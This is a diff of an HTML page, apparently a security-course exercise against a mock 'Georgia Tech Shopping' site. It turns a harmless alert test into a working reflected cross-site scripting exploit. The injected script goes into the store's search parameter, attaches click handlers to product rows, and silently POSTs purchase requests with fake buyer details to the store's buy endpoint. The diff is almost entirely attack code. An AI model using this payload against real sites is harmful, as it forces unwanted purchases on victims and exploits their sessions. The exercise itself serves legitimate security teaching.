@@ -6,21 +6,14 @@
   </head>
 
   <script type="text/javascript">
-   function SOP(){
-
-
+   function xssAttack(){
 	var searchQuery = document.getElementById("q").value;
-	
-	console.log("search query is "+ searchQuery);
-
 	//add a bunch of js code to the end of this url
-	var script = `console.log("before");
+	var script = `
 	document.addEventListener('DOMContentLoaded',(event) => {
 		var tds = document.querySelectorAll("tr");
 		tds.forEach(function(td,index){
-			console.log(index);
 			if(index !== 0){
-
 				var newDiv = document.createElement("div");
 				newDiv.id = index;
 				newDiv.style.width="20px";
@@ -30,22 +23,33 @@
 				newDiv.style.position = "relative";
 				newDiv.style.display = "inline-block";
 				newDiv.style.right="20px";
-				newDiv.onclick = function() {
-					alert(1);
+				newDiv.onclick = function(event) {
+					var Http = new XMLHttpRequest();
+					var formData = new FormData();
+					var href = document.getElementById(index).parentNode.firstChild.href;
+					var product_id = (href.split('='))[1];
+					var cols = document.getElementById(index).parentNode.parentNode.querySelectorAll('td');
+					var name = cols[1].innerHTML;
+					var price = cols[3].innerHTML;
+					formData.append("address","lol");
+					formData.append("mail","lol@lol.com");
+					formData.append("phone","12345");
+					formData.append("price",price);
+					formData.append("product_id", product_id);
+					formData.append("product_name",name);
+					formData.append("ship_date","2011-01-01");
+					var url = 'http://www.gtshop.com/products/buy';
+					Http.open('POST',url);
+					Http.send(formData);
 				};
 				td.lastElementChild.appendChild(newDiv);
 			}
 		});
 		
-		console.log(tds);
-		console.log("after");
 	})
 
-	
 	`
-	
 	var url = "http://www.gtshop.com/products/lookup?q=" + searchQuery + '<script>' + script + '<\/script>'
-
 	window.location.href = url
 	return false
 
@@ -57,7 +61,7 @@
   <body>
     <!-- DO NOT change the form id -->
 
-    <form id="clickjack-form" onsubmit="return SOP()" >
+    <form id="clickjack-form" onsubmit="return xssAttack()" >
     <!-- !!! DO NOT MODIFY ANYTHING BELOW THIS COMMENT !!! -->
       <h1>Georgia Tech Shopping</h1>
       <input type="text" name="q" id="q" />
